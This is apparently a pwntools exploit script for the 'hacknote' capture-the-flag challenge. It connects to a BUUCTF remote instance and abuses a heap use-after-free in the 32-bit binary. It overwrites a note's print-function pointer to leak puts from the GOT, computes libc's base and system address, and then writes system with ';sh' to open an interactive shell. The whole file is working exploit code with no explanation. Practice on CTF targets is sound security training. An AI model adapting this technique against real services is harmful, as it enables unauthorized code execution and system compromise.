from pwn import *

context(arch = 'i386', os = 'linux', log_level = 'debug')

elf = ELF('./hacknote')
ld = ELF('/root/Downloads/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/ld-2.23.so')
libc = ELF('/root/Downloads/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc.so.6')
remote_libc = ELF('/root/Downloads/libc_32.so.6')
#sh = process(elf.path)
#sh = process(argv = [ld.path, elf.path], env = {"LD_PRELOAD" : libc.path})
sh = remote("node4.buuoj.cn", 29366)

free_got = elf.got['free']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
atoi_got = elf.got['atoi']


#gdb.attach(sh)

def add(size, content):
    sh.recvuntil('choice :')
    sh.sendline('1')
    sh.recvuntil('size :')
    sh.sendline(str(size))
    sh.recvuntil('Content :')
    sh.send(content)
 
def dele(idx):
    sh.sendline('2')
    sh.recvuntil('Index :')
    sh.sendline(str(idx))
 
def show(idx):
    sh.sendline('3')
    sh.recvuntil('Index :')
    sh.sendline(str(idx))

add(24, b'a\n')
add(24, b'a\n')
dele(0)
dele(1)
add(8, p32(0x804862B) + p32(elf.got['puts']))
show(0)
#gdb.attach(sh)
addr = u32(sh.recvuntil('\xf7'))
log.info("puts addr : " + hex(addr))
libc_base = addr - remote_libc.sym['puts']
system_addr = libc_base + remote_libc.sym['system']
log.info("libc base : " + hex(libc_base))
log.info("system_addr : " + hex(system_addr))
dele(1)
add(8, p32(system_addr) + b';sh\x00')
show(0)






sh.interactive()

